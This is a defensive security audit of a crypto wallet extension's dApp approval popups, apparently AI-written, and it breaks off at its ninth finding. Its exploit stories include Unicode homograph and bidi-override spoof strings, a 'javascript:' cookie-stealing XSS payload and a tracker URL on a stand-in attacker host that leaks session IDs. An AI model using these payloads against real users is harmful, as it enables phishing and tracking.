# C6 — DappInteractionService + popup approval flows (Claude Opus Pass 1)

## Findings

### Finding 1 — Attacker-controlled token symbol / name rendered in popups without Unicode sanitization (homograph + bidi-override phishing)

**Title**: The `register_token` execute popup and the `IncomingTrustPopup` render the on-chain contract's `name` / `symbol` strings (read via `previewTokenMetadata` / `tokenSymbol` payload) directly through Vue interpolation. Vue auto-escapes HTML, but DOES NOT strip Unicode bidi-override (U+202E), zero-width joiners (ZWJ/ZWNJ/ZWSP), variation selectors, or homograph confusables. A malicious contract can present "U" + "S" + "D" + Cyrillic-С (U+0421) as "USDC", or use RLO to reorder the symbol visually. The wallet already ships `sanitizeWireString` for exactly this concern (`packages/extension/src/wallet/services/dapp-session/capability-meta.ts:155`) but the trust-critical token approval surfaces do NOT call it.

**Impact factors**:
- CIA+A: **Integrity** + **Authentication** (impersonation of trusted token brand).
- Blast radius: every wallet user prompted to `register_token` for a non-allowlisted token, AND every user receiving a first-time transfer from an unknown contract. Phishing-token contracts are zero-cost to deploy.
- Exploitability: AV:Network / AC:Low / PR:None / UI:Required (the user must approve, but the popup is *the trust surface being attacked*).

**Evidence confidence**: **high** — concrete sink trace, sanitizer exists in repo and is intentionally absent here.

**OWASP / CWE mapping**: A04:2021 Insecure Design — **CWE-1007** (Insufficient Visual Distinction of Homoglyphs), **CWE-451** (User Interface (UI) Misrepresentation of Critical Information), **CWE-176** (Improper Handling of Unicode Encoding).

**Trace** (source → sink):
1. Source — dApp deploys hostile token contract with `getName()` returning `"USDᏟ"` (Cherokee Ꮯ U+13CF) or `"USDC‮"` (with RLO trailing).
2. dApp calls `registerToken(account, contractAddress)` → wallet-bridge dispatcher → `dappInteractionService.execute(...)` → popup opens.
3. `execute/index.vue:280` calls `tokenService.previewTokenMetadata(networkId, accountAddress, contractAddress)`.
4. `previewTokenMetadata` (extension's `wallet/services/token/service.ts:460`) calls the contract's `getName` / `getSymbol` / `getDecimals` and returns the raw strings.
5. `tokenMetadata.value.set(op.address, { name: meta.name, symbol: meta.symbol, decimals: meta.decimals })` at `execute/index.vue:281`.
6. Sink — `OperationCard.vue:223` renders `{{ tokenMetadata.symbol }}` and `:231` renders `· {{ tokenMetadata.name }}`. Vue HTML-escapes but does NOT strip Unicode bidi / zero-width.
7. Parallel sink — `IncomingTrustPopup.vue:135` renders `<h2>Allow {{ tokenSymbol }}?</h2>` and `:137` renders `<strong>{{ formattedAmount }} {{ tokenSymbol }}</strong>`. `tokenSymbol` originates from `IncomingTransferPending.tokenSymbol` (set at `incoming-transfer/service.ts:653` from `token.symbol` — same dApp-controlled value).

**Missing control**: All four sinks must pipe attacker-controlled token strings through `sanitizeWireString(input, 32 /* or similar cap */)` (`capability-meta.ts:161`), which strips `\p{Cf}`, variation selectors, and C0/C1 control chars. The capabilities popup already does this for `cap.type` strings (`CapabilityDetailPanel.vue:314`).

**Exploit story**:
1. Attacker deploys a phishing-token contract whose `getName()` returns `"USD Coin"` and `getSymbol()` returns `"USDᏟ"` (Cherokee Ꮯ U+13CF — visually identical to Latin "C" in many fonts).
2. Attacker socially-engineers victim to visit `attacker-faucet.example` and click "Claim USDC drop."
3. dApp calls `registerToken(victim_account, attacker_contract)`. Popup opens showing `USD Coin` / `"USDᏟ"` / `18 decimals` / contract address `0xabcd...1234`.
4. Victim — already in the "claiming USDC" frame — confirms.
5. Token is registered. Future receives from `attacker_contract` (zero-cost public-transfer drops) trigger the `IncomingTrustPopup` showing `Allow USDᏟ?` — same homograph attack again. Victim allows.
6. Now `attacker_contract`'s symbol "USDᏟ" appears in the token list, the activity feed, every transfer popup, and the receive-display, indistinguishable from real USDC at a glance. Victim sends real USDC to attacker-controlled address using the spoofed-token row's quick-action.

**Why mitigations fail**:
- The contract-address line below the symbol DOES help defenders, but only a paranoid user reads addresses; the symbol is what they trust.
- The comment at `OperationCard.vue:217-219` acknowledges "the symbol/name come straight from the on-chain contract and are attacker-controllable" but stops at "render the contract address below" — does not sanitize the symbol.
- The `IncomingTrustPopup` comment at `:13-15` explicitly calls out the `registerToken` pollution vector but the symbol is still rendered raw.
- No fixture / test exercises bidi / ZWJ / homograph token names.

**Instances**:
- `packages/extension/src/popup/windows/execute/OperationCard.vue:222-237` — `register_token` row rendering `tokenMetadata.symbol` and `.name` without sanitization.
- `packages/extension/src/popup/components/popups/IncomingTrustPopup.vue:49` — `tokenSymbol` computed.
- `packages/extension/src/popup/components/popups/IncomingTrustPopup.vue:135,137` — `tokenSymbol` rendered in title and body without sanitization.
- `packages/extension/src/popup/components/popups/IncomingTrustPopup.vue:90,102` — symbol interpolated into toast `label` (additional sink).
- `packages/extension/src/wallet/services/dapp-session/capability-meta.ts:155-166` — existing `sanitizeWireString` helper that is NOT invoked here.

---

### Finding 2 — `dapp.name` (dApp-supplied) rendered without sanitization in every approval popup (homograph + bidi-override phishing of dApp identity)

**Title**: All four dApp-interaction popups (`discover`, `execute`, `capabilities`, `verify`) render `dapp.name` directly through `<DappIdentityBlock>`. `dapp.name` originates from `discovery.appName` (a dApp-controlled string set by the dApp in its `DiscoveryRequest`) and is rendered with `{{ dapp.name }}` — HTML-escaped but NOT Unicode-sanitized. A malicious dApp can name itself `"Uniswap‮"` (RLO trailing) or `"Uniswap"` with Cyrillic chars. The hostname IS the cryptographic identity and DOES get an IDN warning chip, but the `name` line below it (`DappIdentityBlock.vue:47`) is the primary affordance the user reads.

**Impact factors**:
- CIA+A: **Integrity** + **Authentication** (impersonation of a trusted dApp name).
- Blast radius: every dApp-approval popup. Any first-connect, any `requestCapabilities`, any `sendTx`, any `registerToken`. A user familiar with "Uniswap" or "Aave" sees the name they trust and skims past the hostname.
- Exploitability: AV:Network / AC:Low / PR:None / UI:Required (popup approval, but the popup is the surface being phished).

**Evidence confidence**: **high** — concrete sink trace, no inferred control-flow.

**OWASP / CWE mapping**: A04:2021 Insecure Design — **CWE-1007** (Insufficient Visual Distinction of Homoglyphs), **CWE-451** (UI Misrepresentation), **CWE-290** (Authentication Bypass by Spoofing).

**Trace** (source → sink):
1. Source: dApp wire — `DiscoveryRequest.appName` set by the dApp (per the upstream `@aztec/wallet-sdk` protocol).
2. `background.ts:425` stores into session as `dappMetadata.name`: `name: discovery.appName ?? discovery.appId`.
3. `dappSessionService.addDappSession({ name, url }, ...)` persists with no normalization.
4. Popup mount → `useDappInteractionPayload.load()` → `dappOf(payload)` returns `payload.session.dappMetadata`.
5. Sink — `DappIdentityBlock.vue:47`: `<span :data-testid="nameTestId" :class="$style.dapp_name">{{ dapp.name }}</span>`. Same renders at `verify/index.vue:210` and `execute/OperationCard.vue:156` (`{{ dapp?.name ?? 'the app' }}` inside the "Fee payment method set by …" badge).

**Missing control**: `dapp.name` must be passed through `sanitizeWireString(name, 64)` either at the persistence boundary (in `background.ts:425`) or at the render boundary. The render-boundary fix is preferred because it avoids re-migrating already-persisted sessions.

**Exploit story**:
1. Attacker registers `uniswap-app.com` (cleanly spelled hostname but un-affiliated with Uniswap).
2. Attacker's dApp on first-connect sends `appName: "Uniswap"` — same casing, no homoglyph needed. Popup shows hostname `uniswap-app.com` (subtle, user skims) and below it in `dapp_name` style: `Uniswap`. User trusts the brand.
3. Attacker variant: sends `appName: "Uniswap‮‮‮"` to push the hostname rendering. Or `appName: "Aave (official)​​​" ` to pad visible chars with ZWSP (looks identical, but if log-greppers/analytics rely on exact-match of `dappMetadata.name`, those drift).
4. Worst case — attacker chains with a future `dappMetadata.logo` flow (see Finding 6) and renders a fake logo + Uniswap-styled name.

**Preconditions**:
- Attacker controls a domain (cheap).
- Wallet SDK accepts arbitrary `appName` (it does — no length / charset check exists in the wallet-sdk handler).

**Why mitigations fail**:
- Hostname IDN warning fires only for non-ASCII hostnames (`useDappHostname.ts:19-25`), NOT for the `name` field.
- `verify` popup's emoji-grid + `verificationHash` defends against ECDH MITM, not against impersonation of a freshly-registered dApp.
- No length cap — a 1000-char `appName` works.

**Instances**:
- `packages/extension/src/components/composite/DappIdentityBlock.vue:47` — `{{ dapp.name }}` sink (shared by `discover`, `execute`, `capabilities`).
- `packages/extension/src/popup/windows/verify/index.vue:210` — duplicate `<span :class="$style.dapp_name">{{ dapp.name }}</span>` (`verify` window does not yet use `DappIdentityBlock`).
- `packages/extension/src/popup/windows/execute/OperationCard.vue:156` — `{{ dapp?.name ?? 'the app' }}` in the embedded-fee badge.
- `packages/extension/src/wallet/services/wallet-sdk/background.ts:424-427` — persistence point (alternative sanitize site).

---

### Finding 3 — dApp-controlled `call.name` / `action.method` (function name string) rendered through `humanizeMethodName` without Unicode sanitization in `aztec_sendTx` / `send_transaction` / `aztec_createAuthWit` popups

**Title**: The execute popup's `OperationCard.vue` renders the dApp-supplied function name (`call.name`, `action.method`, `action.name`, `action.selector`) for every payload row via `humanizeMethodName(...)`. `humanizeMethodName` (`utils/tx-enrichment.ts:52`) does title-casing + selector-truncation but DOES NOT strip Unicode bidi / zero-width chars. A malicious dApp can name a function `"transfer‮"` or `"approve​transfer"` to render misleading text in the user's tx-approval popup.

**Impact factors**:
- CIA+A: **Integrity** + **Authorization** (user approves a tx whose displayed function name doesn't match what's actually being called on-chain).
- Blast radius: every dApp-initiated `sendTx`, `simulateTx`, `profileTx`, `executeUtility`, `createAuthWit` approval popup.
- Exploitability: AV:Network / AC:Low / PR:None / UI:Required (the popup is the surface being attacked).

**Evidence confidence**: **high** — direct sink trace.

**OWASP / CWE mapping**: A04:2021 Insecure Design — **CWE-451** (UI Misrepresentation of Critical Information), **CWE-176** (Improper Unicode Handling).

**Trace** (source → sink):
1. Source: dApp wire — `FunctionCall.name: string` in `@aztec/stdlib/abi`. Per the SDK contract, the dApp constructs `ExecutionPayload.calls[i]` with a self-described `name`. The wallet has no allowlist for this string.
2. Wallet-bridge `dispatcher.ts:411-417` forwards the dApp's `exec` payload verbatim into `AztecSendTxRequest.exec`.
3. Popup hydrates → `execute/index.vue:181` iterates `payload.params.operations`, stores `op.exec.calls` for `aztec_sendTx` (`:216-235`) — names preserved as-is.
4. Sink — `OperationCard.vue:134`: `{{ humanizeMethodName(call.name ?? call.selector) }}`. Same at `:325` (aztec_simulateTx), `:340` (executeUtility), `:357` (profileTx), `:394` (createAuthWit). For `send_transaction`, source is `action.method` (`call` kind) or `action.name` (`encoded_call` kind) — `:114, :266`.
5. `humanizeMethodName` (`utils/tx-enrichment.ts:52-65`): does `METHOD_LABELS` lookup, otherwise hex-selector clamp, otherwise `method.replace(/_/g, " ").replace(/\b\w/g, …)` — no Unicode sanitization.

**Missing control**: `humanizeMethodName` (and every callsite in OperationCard) must pipe the input through `sanitizeWireString(name, 64)` before processing. The existing `CapabilityDetailPanel.vue:36-38` already does this for the scope-list rendering of the same family of strings:
```ts
function fnLabel(fn: string): string {
  return sanitizeWireString(fn, 64)
}
```

**Exploit story**:
1. Attacker deploys a malicious contract with a function named `"safeTransferFrom‮refer_uoY‬esoohc"` — RLO reverses "you_chose" so the popup renders `"safe transfer from you chose"` visually but the on-chain function name is the reversed-malicious-named function the attacker wired into a phishing-router that drains funds.
2. dApp calls `sendTx({ calls: [{ to: <attacker>, name: <malicious_name>, selector: <legit_safeTransferFrom_selector_hex>, args: [...] }] })`.
3. Popup renders `Safe transfer from you chose on 0xabcd…1234` (or similar visually-clean text). User confirms thinking they're calling `safeTransferFrom`.
4. On-chain, the call selector dispatches to the attacker's drain function.

The `humanizeMethodName` path runs `name ?? selector` — the selector IS the actual on-chain dispatch key, but the dApp gets free rein on `name`. The user sees `name`, not selector.

**Preconditions**:
- dApp has `transaction` capability with scope covering the attacker contract + selector. Trivially satisfied: the attacker controls the contract and pre-deploys whatever functions they want.

**Why mitigations fail**:
- `METHOD_LABELS` (`tx-enrichment.ts:14-31`) is an allowlist of friendly labels for known function names; an unknown name falls through to the title-case path (which preserves Unicode bidi chars).
- The contract address renders alongside via `<AddressDisplay>`, but again paranoid-user defense only.
- `CapabilityDetailPanel.vue:36-38` already strips wire-control for the same string type — proving the team agrees this is sensitive — but the execute popup, which is the live-decision surface, does not.

**Instances**:
- `packages/extension/src/popup/windows/execute/OperationCard.vue:114, 134, 266, 285, 325, 340, 357, 394` — all `humanizeMethodName(...)` callsites with dApp-controlled strings.
- `packages/extension/src/utils/tx-enrichment.ts:52-65` — `humanizeMethodName` (the sanitize point).

---

### Finding 4 — `aztec_registerContract` artifact `name` rendered without sanitization (homograph + bidi attack on contract identity)

**Title**: The execute popup's `OperationCard.vue:371` renders `{{ op.artifact.name ?? "(custom)" }}` for `aztec_registerContract` operations. `artifact.name` is the dApp-supplied `ContractArtifact.name` — completely attacker-controlled. The dispatcher validates the class-id matches the instance, but the displayed `artifact.name` does not have to match the canonical name of that class-id; it's a free-form string the dApp can spoof to mislabel the contract.

**Impact factors**:
- CIA+A: **Integrity** + **Authorization** (user trusts a registered contract under a spoofed name; subsequent UI references render the same spoofed name).
- Blast radius: every dApp-initiated `aztec_registerContract` popup.
- Exploitability: AV:Network / AC:Low / PR:None / UI:Required.

**Evidence confidence**: **high** — direct sink trace, no inferred behavior.

**OWASP / CWE mapping**: A04:2021 Insecure Design — **CWE-451** (UI Misrepresentation), **CWE-1007** (Homoglyphs), **CWE-176** (Improper Unicode Handling).

**Trace** (source → sink):
1. Source: dApp wire — `AztecRegisterContractRequest.artifact?: ContractArtifact` carries `name: string` as a top-level field.
2. Wallet-bridge dispatcher forwards `args[1]` (artifact) into `aztec_registerContract` op (`dispatcher.ts:780`+).
3. Execute popup at `index.vue:184-195` stores the op with `network` and `networkId` added — `op.artifact` is preserved as-is.
4. Sink — `OperationCard.vue:369-372`:
   ```vue
   <Flex v-if="op.artifact" :class="$style.prop">
     <Text size="12" color="secondary">Artifact:</Text>
     <Text size="12" color="primary">{{ op.artifact.name ?? "(custom)" }}</Text>
   </Flex>
   ```
   Vue HTML-escapes but does NOT strip Unicode bidi / zero-width.

**Missing control**: Pipe `op.artifact.name` through `sanitizeWireString(name, 64)` at the render boundary.

**Exploit story**:
1. Attacker deploys a contract with class-id `0xABCD…`. The attacker compiles their contract with `ContractArtifact.name = "USDC‬‮"` (or any homograph).
2. dApp calls `aztec_registerContract({ instance: <attacker_instance>, artifact: <attacker_artifact_with_spoofed_name> })`.
3. Popup renders `Contract address: 0x…<attacker_addr>` + `Artifact: USDC` (the spoofed name).
4. User assumes they're registering the legit USDC contract for whatever dApp purpose. They approve.
5. PXE now has the attacker contract registered. The contract address is the only reliable identifier; every subsequent UI reference that re-renders `artifact.name` will repeat the spoofing.

**Why mitigations fail**:
- Class-id ↔ instance validation (`execution/service.ts:1694-1697`) protects against artifact-instance mismatch, but the dApp-controlled `name` field is not the class-id.
- No mapping from `artifact.name` → canonical class-id is enforced.

**Instances**:
- `packages/extension/src/popup/windows/execute/OperationCard.vue:369-372` — sink.

---

### Finding 5 — Token-symbol toast (`IncomingTrustPopup`) interpolates dApp-controlled `tokenSymbol` directly into toast strings, propagating phishing-symbol confusion past popup close

**Title**: `IncomingTrustPopup.vue:90,102` constructs toast labels via template literal: ``Now showing receives for ${tokenSymbol.value}`` and ``Hiding receives from ${tokenSymbol.value}``. `tokenSymbol` is the attacker-controlled `IncomingTransferPending.tokenSymbol` (from on-chain contract `getSymbol()`). The toast renders in a global toast-stack visible at the top of every page; a Unicode RLO embedded in the symbol could flip surrounding text. This compounds Finding 1 — the user dismisses the popup and the toast carries the spoofed symbol forward into a top-bar UI element.

**Impact factors**:
- CIA+A: **Integrity** (UI continues misrepresenting the symbol after popup dismissal).
- Blast radius: same as Finding 1 plus toast-stack rendering.
- Exploitability: AV:Network / AC:Low / PR:None / UI:Required.

**Evidence confidence**: **high**.

**OWASP / CWE mapping**: **CWE-451**, **CWE-176**.

**Trace** (source → sink):
1. Source: `cacheStore.incomingTrust.tokenSymbol` = attacker-controlled contract symbol.
2. Sink — `IncomingTrustPopup.vue:90`:
   ```js
   openToast({ label: `Now showing receives for ${tokenSymbol.value}`, icon: "check" })
   ```
   And `:102`:
   ```js
   openToast({ label: `Hiding receives from ${tokenSymbol.value}`, icon: "info" })
   ```

**Missing control**: Sanitize `tokenSymbol.value` before interpolation:
```js
openToast({ label: `Now showing receives for ${sanitizeWireString(tokenSymbol.value, 16)}`, icon: "check" })
```

**Instances**:
- `packages/extension/src/popup/components/popups/IncomingTrustPopup.vue:90, 102`.

---

### Finding 6 — DappMetadata.logo TYPE-LEVEL XSS hazard: `<img :src="dapp.logoBlobUrl">` renders dApp-supplied URL with no scheme validation (latent — no current write path, but template-XSS hazard)

**Title**: The `DappMetadata` type allows `logo?: string` (`packages/extension/src/wallet/services/dapp-session/spec.ts:30`). The popup-side composable `useDappInteractionPayload.ts:92` does `if (meta.logo) meta.logoBlobUrl = meta.logo` — a verbatim copy with no URL parsing or scheme check. The popup template binds `<img v-else-if="dapp?.logoBlobUrl" :src="dapp?.logoBlobUrl" alt="" />` directly (`DappIdentityBlock.vue:31`, `verify/index.vue:194`, `connected-apps/[id].vue:202`, `connected-apps/index.vue:144`). Today's only code path that writes `dappMetadata` is `background.ts:424-427` which sets `{ name, url }` only — NO logo. But this is a fragile invariant: ANY future code path that passes through a dApp-supplied `logo` field will hit live XSS via `javascript:` or `data:text/html` URL schemes when bound to `<img :src>` (though browsers do not execute scripts in `<img src="javascript:...">`, they DO load arbitrary HTTP URLs which leaks `(request_time, popup_seen)` → tracker, and a `data:image/svg+xml,...` can carry inline scripts that execute via the `<img>` triggering only when the URL is opened in a new tab, but a `<style>` with `background:url(...)` from CSS bound to a dApp-controlled value would be live).

**Impact factors**:
- CIA+A: **Integrity** + **Confidentiality** (tracking-pixel-style fingerprinting via `<img>` GET; if a future PR routes the field into a CSS-binding sink, code execution).
- Blast radius: every popup that renders `<DappIdentityBlock>` (discover, execute, capabilities) + verify + connected-apps settings.
- Exploitability today: NIL (no write path); on first regression: AV:Network / AC:Low / PR:None.

**Evidence confidence**: **medium** — sinks are confirmed open; source path is type-level open but currently unused.

**OWASP / CWE mapping**: **CWE-79** (XSS) class hazard, **CWE-1188** (Insecure Default Initialization of Resource), **CWE-918** (Server-Side Request Forgery — for the image GET leaking popup-open events to attacker server).

**Trace** (source → sink):
1. Type: `DappMetadata.logo?: string` (`dapp-session/spec.ts:30`) — no shape constraint, no allowlist.
2. Today's source — `background.ts:424-427` does NOT set `logo`. Latent.
3. Sink loader — `useDappInteractionPayload.ts:90-94`:
   ```ts
   const meta = dappOf(result) as UIDappMetadata | undefined
   if (meta) {
     if (meta.logo) meta.logoBlobUrl = meta.logo
     dapp.value = meta
   }
   ```
4. Template sink — `DappIdentityBlock.vue:31`:
   ```vue
   <img v-else-if="dapp?.logoBlobUrl" :src="dapp?.logoBlobUrl" :class="$style.dapp_logo" alt="" />
   ```
5. Same shape at `verify/index.vue:194`, `connected-apps/[id].vue:201-202`, `connected-apps/index.vue:143-144`.

**Missing controls**:
1. `DappMetadata.logo` should be a typed branded type with a runtime parse check (`new URL(logo)` and `["https:", "data:image/png", "data:image/jpeg", "data:image/svg+xml"].includes(parsed.protocol)`) at the storage / wire boundary.
2. The composable's logo-copy step (`useDappInteractionPayload.ts:92`) should refuse non-`https:` / non-data-image schemes.
3. Existing template tests (`DappIdentityBlock.test.ts`) should pin the scheme-allowlist.

**Exploit story** (the next time a logo write path lands):
1. Future PR adds a "rich session metadata" code path that pulls a dApp-supplied logo into the session.
2. Attacker dApp ships `logo: "http://attacker-tracker.example/pixel?v=" + sessionId`.
3. Every time a Nulo user opens any popup for this dApp, a GET request fires to the tracker, leaking the popup-open event and tying it to the persistent session id.
4. Or: `logo: "javascript:alert(document.cookie)"` — `<img src>` doesn't execute, but a regression to CSS background-image binding would.
5. Or: `logo: "data:image/svg+xml,..."` SVG containing `<foreignObject>` with HTML — executes inline JS in some renderers (mitigated by CSP in MV3 but still scheme-validate).

**Why mitigations fail today**: No mitigations exist at the source / loader. The wallet's CSP (default MV3) blocks `<script>` injection but does NOT block `<img src=https://attacker>`.

**Instances**:
- `packages/extension/src/wallet/services/dapp-session/spec.ts:30` — unconstrained type.
- `packages/extension/src/composables/useDappInteractionPayload.ts:91-94` — verbatim copy.
- `packages/extension/src/components/composite/DappIdentityBlock.vue:31` — `<img :src>` bind.
- `packages/extension/src/popup/windows/verify/index.vue:194` — duplicate.
- `packages/extension/src/popup/pages/settings/connected-apps/[id].vue:201-202` — connected-apps detail.
- `packages/extension/src/popup/pages/settings/connected-apps/index.vue:143-144` — connected-apps list.

---

### Finding 7 — `getRandomHex(16)` produces 64 bits, not the comment-claimed 128 bits; popup `requestId` is half the entropy promised by defense-in-depth comment

**Title**: `DappInteractionService.interaction()` at `service.ts:220-221` generates the popup `requestId` via:
```ts
// 16 bytes / 128 bits (codex-round-1 defense-in-depth).
id = getRandomHex(16)
```
The comment claims 128 bits. `getRandomHex(length)` in `packages/wallet-core/src/utils/random.ts:13-16` is:
```ts
export const getRandomHex = (length: number): string => {
  const bytes = self.crypto.getRandomValues(new Uint8Array(length / 2))
  return toHex(bytes)
}
```
So `getRandomHex(16)` → 8 bytes / 64 bits, not 16 bytes / 128 bits. The `length` parameter is the HEX-CHAR count, not the byte count. The defense-in-depth claim is wrong by half. The `windowManager.openAndAwait` uses `getRandomHex(8)` → 32 bits.

**Impact factors**:
- CIA+A: **Authentication** + **Integrity** (defense-in-depth against same-extension-context request-id guessing; not the primary defense, but the documented one).
- Blast radius: theoretical, depends on attack model. Same-extension contexts (popup, content script, offscreen) can in principle call `getInteractionPayload(id)` and `approveInteraction(id, ...)` on a guessed id; the wallet-sdk content script does NOT have direct access to these methods (per `chrome.runtime.onConnect`'s same-extension scope and the wallet-bridge dispatcher's method allowlist), so the practical attack surface today is internal-bug-mediated (e.g., a future feature that hosts dApp HTML in an extension page).
- Exploitability: 64 bits is not brute-forceable in any practical scenario; the finding is principally a comment-vs-implementation drift defect, which is exactly the kind of thing that decays into a real bug at the next refactor.

**Evidence confidence**: **high** — the math is concrete; the comment is concrete.

**OWASP / CWE mapping**: **CWE-330** (Use of Insufficiently Random Values — relative to the comment-claimed standard), **CWE-1041** (Use of Redundant Code) for the comment-vs-code drift. CVSS-low.

**Trace**:
1. `service.ts:220-221` — claims 128 bits.
2. `random.ts:14` — `new Uint8Array(length / 2)` → halves.
3. `windowManager.openAndAwait` at `window-manager.ts:54`: `handleId = getRandomHex(8)` → 32 bits, no defense-in-depth comment but the same drift family.

**Missing control**:
- Either rename the helper to `getRandomHex(byteCount)` (matching the comment's contract) OR update the comment + callsite to `getRandomHex(32)` for 128 bits.
- Sanity-check every callsite of `getRandomHex` for under-entropy (operation-journal at `service.ts:172` uses 16 → 64 bits; profile repo uses `PROFILE_ID_HEX_LENGTH` whatever that is; contact at 8 → 32 bits; passkey at 8 → 32 bits).
- The DappInteraction popup `requestId` AND the handle-id should both bump to ≥ 128 bits (16 bytes → `getRandomHex(32)` under current API).

**Instances**:
- `packages/extension/src/wallet/services/dapp-interaction/service.ts:220-221` — drift.
- `packages/wallet-core/src/utils/random.ts:13-16` — confusing API (length is hex-chars, not bytes).
- `packages/extension/src/wallet/services/window-manager/window-manager.ts:54` — only 32 bits handle-id.

---

### Finding 8 — IncomingTransferService trust-flip vs concurrent-poll race (auto-trust may lose to in-flight scanner on same `(network, account)` key, leaking Pending event for self-added token)

**Title**: `IncomingTransferService.onTokenAdded` (`service.ts:431-466`) is invoked synchronously via `EventHandler.invoke()` (`event-handler.ts:22-28`) when `TokenService.addToken` emits `onTokenAdded` — but the handler is `async` and the emitter does NOT await its return. `addToken` then returns to the caller (popup or dApp-execute) BEFORE the trust-flip lock-section completes. Meanwhile, the existing per-account poller (`startScheduler` already created for some OTHER contract on the same `(network, account)` key) may iterate over the `watchedContracts.get(key)` Set; in JavaScript, mutating a Set during iteration with `for-of` DOES yield the newly-added member to the in-flight iterator. The poll's `scanContract` for the new contract runs `getNotesRaw` OUTSIDE the lock; if the dApp has been pre-emitting notes from the contract to the user's account (zero-cost public transfer drop), `scanContract`'s per-note critical section races the trust-flip lock-section. If `scanContract`'s lock acquisition wins (FIFO lock), the live re-read sees `trust = "unknown"`, flips to `"pending"`, emits `onIncomingTransferPending` BEFORE the trust-flip handler runs. The user gets the trust popup for a token they JUST explicitly added — exactly the friction the auto-trust was supposed to eliminate, AND a security regression because the Allow/Block popup is then the only thing standing between the user and a phishing-token's note feed.

**Impact factors**:
- CIA+A: **Integrity** + **Authorization** (defense-in-depth: the auto-trust→trusted flip is the documented invariant the comment at `service.ts:440-448` relies on).
- Blast radius: any user who explicitly adds a token (via NewTokenPopup or via dApp registerToken) on a `(network, account)` triple that ALREADY has other tokens being polled, AND the new token's contract has been pre-emitting notes to that account. The pre-emit pattern is exactly how phishing-token drops work in EVM — apply the same playbook to Aztec.
- Exploitability: AV:Network / AC:High (race window is tight, but not impossible; phishing-token authors only need to land it once per victim) / PR:None / UI:Required.

**Evidence confidence**: **medium** — the race window IS narrow (microtasks between `emit` and `withServiceLock` acquisition), but `EventHandler.invoke` is sync-fire-async-handler, and the lock-section is the FIRST async statement of `onTokenAdded`, so an in-flight poll's per-note CS DOES have a realistic shot at winning the lock-FIFO. The memory note acknowledges this exact concern: *"incoming-transfer trust refactor deferred — 6-cycle audit-fix arc closed concrete races; codex recommends per-triple serialized critical section before adding new trust state transitions."*

**OWASP / CWE mapping**: **CWE-362** (Concurrent Execution using Shared Resource with Improper Synchronization — Race Condition), **CWE-820** (Missing Synchronization).

**Trace**:
1. `TokenService.addToken` at `wallet/services/token/service.ts:183`:
   ```ts
   this.emit("onTokenAdded", getTokenInfo(token))
   ```
   `EventHandler.invoke` (`packages/wallet-core/src/utils/event-handler.ts:22-28`) runs callbacks synchronously, discards returned promises.
2. `IncomingTransferService.onTokenAdded` at `wallet/services/incoming-transfer/service.ts:431` is `async`:
   ```ts
   private onTokenAdded = async (token: TokenInfo): Promise<void> => {
     ...
     await this.withServiceLock(async () => { // ← FIRST await
       const current = await this.repo.getTrust(...)
       if (current?.state === "trusted") return
       await this._setTrustStateLocked(profile.id, network.id, token.contract, "trusted")
     })
     ...
   }
   ```
3. Concurrently, a previously-active poll's `scanContract` is in its critical-section loop (`service.ts:599-684`), iterating notes. The Set-iteration semantics make the new contract visible to the in-flight `poll`'s `for (const contract of contracts)` IF the iterator hasn't yet exited.
4. `scanContract` per-note CS at `service.ts:601-684` does `withServiceLock(async () => { ... live re-read of trust ... if (trustState === "unknown") { setTrust(pending); emit Pending } ... })`. FIFO lock — whoever calls `enter()` first wins.
5. Pre-emit phishing model: the attacker contract has already minted notes to the user's account address. By the time the user adds the token, those notes are already on PXE. The first poll iteration picks them up.

**Missing control**: The trust-flip must execute **synchronously with respect to** any scan-init for that contract. Two viable approaches:
- (a) Make `TokenService.emit("onTokenAdded", ...)` await every async handler before `addToken` returns — change `EventHandler.invoke` to `async invoke(): Promise<void>` and `await Promise.all(callbacks.map(c => c(payload)))`. Codex's "per-triple serialized critical section" recommendation from the memory note.
- (b) Move the trust-flip INSIDE `TokenService.addToken` (under TokenService's own lock), so the `onTokenAdded` event is emitted only AFTER trust=trusted is persisted.
- (c) Have `scanContract` short-circuit when the contract was added in the last N seconds (timestamp-based grace), but this is a leaky band-aid.

**Exploit story**:
1. Attacker deploys a phishing-token contract that mints public transfers to a wide list of victim addresses (Aztec public mempool scanning OR known-address-list dump). Cost: a few cents per transfer.
2. Victim hasn't added this contract yet. PXE silently has the note(s) sitting waiting.
3. Victim later adds a different legitimate token (USDC). The IncomingTransferService's poll for the victim's account starts running, iterating `watchedContracts.get(key) = {USDC}`. While scanning, the per-account scheduler is now polling.
4. Phishing window: victim later adds the phishing-token (perhaps because the dApp says "claim airdrop"). `addToken` returns. Async `onTokenAdded` queues. Meanwhile, the in-flight USDC poll picks up the new phishing contract via Set-iteration (already added at `service.ts:463`), enters `scanContract(phishing_contract)`, calls `getNotesRaw` — gets the pre-emit notes. Enters per-note CS, acquires lock first, reads trust = "unknown" (because `onTokenAdded`'s trust-flip lock-section hasn't acquired yet), flips to "pending", emits Pending.
5. `onTokenAdded` finally acquires the lock, flips trust to "trusted" — but the Pending event has already been emitted, the user now sees the IncomingTrustPopup for a token they explicitly just added. Either (a) user is confused and clicks Block (denial-of-service against their own token), or (b) user clicks Allow without thinking, having already been social-engineered into the "claim airdrop" frame.
6. The user-friction-removal claim documented in `service.ts:440-448` ("the first-receive trust popup that fires moments later is redundant friction") fails specifically for the case the comment is supposed to handle.

**Why mitigations fail**:
- The `withServiceLock` is per-service; it serializes correctly across trust-flip and per-note CS — but only AFTER `onTokenAdded` reaches the `await` keyword and queues for the lock. The poll's per-note CS can sneak in ahead.
- The "lifecycle epoch" guard (`service.ts:569`) protects against profile-deletes, not trust-flip races.
- Idempotency in `onTokenAdded` (`current?.state === "trusted" return`) helps for the SECOND `onTokenAdded` invocation, not the first one losing the race.

**Instances**:
- `packages/wallet-core/src/utils/event-handler.ts:22-28` — sync-only `invoke` (root cause).
- `packages/extension/src/wallet/services/token/service.ts:183` — `emit("onTokenAdded", …)` fire-and-forget.
- `packages/extension/src/wallet/services/incoming-transfer/service.ts:431-466` — async handler.
- `packages/extension/src/wallet/services/incoming-transfer/service.ts:599-684` — per-note CS with lock-FIFO race.

---

### Finding 9 — Wrong-profile / wrong-account approval window stays open displaying stale dApp identity after user switches; `onActiveProfileChanged` fires only the popup-level `reject()` but the user can still see (and trust) the popup contents

